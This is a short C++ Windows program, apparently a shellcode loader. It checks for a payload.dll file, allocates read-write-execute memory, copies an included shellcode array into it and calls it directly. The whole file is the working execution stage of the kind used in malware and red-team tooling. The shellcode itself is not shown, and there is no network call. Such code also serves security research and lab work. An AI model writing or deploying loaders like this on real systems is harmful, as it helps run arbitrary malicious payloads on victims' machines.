// loader.cpp

#include <windows.h>
#include <cstdio>

#include "shellcode.h"

int main()
{
    HANDLE h = CreateFileA("payload.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (INVALID_HANDLE_VALUE == h)
    {
        printf("[-] payload.dll NOT found in current directory.\n");
        return 1;
    }

    LARGE_INTEGER sz;
    GetFileSizeEx(h, &sz);
    printf("[+] payload.dll found: %lld bytes\n", sz.QuadPart);
    CloseHandle(h);

    void *mem = VirtualAlloc(nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem)
    {
        printf("[-] VirtualAlloc failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[*] RWX memory at: 0x%p\n", mem);

    memcpy(mem, shellcode, sizeof(shellcode));

    printf("[*] jumping into shellcode...\n");
    fflush(stdout);

    ((void(*)())mem)();

    printf("[*] returned cleanly.\n");
    VirtualFree(mem, 0, MEM_RELEASE);

    return 0;
}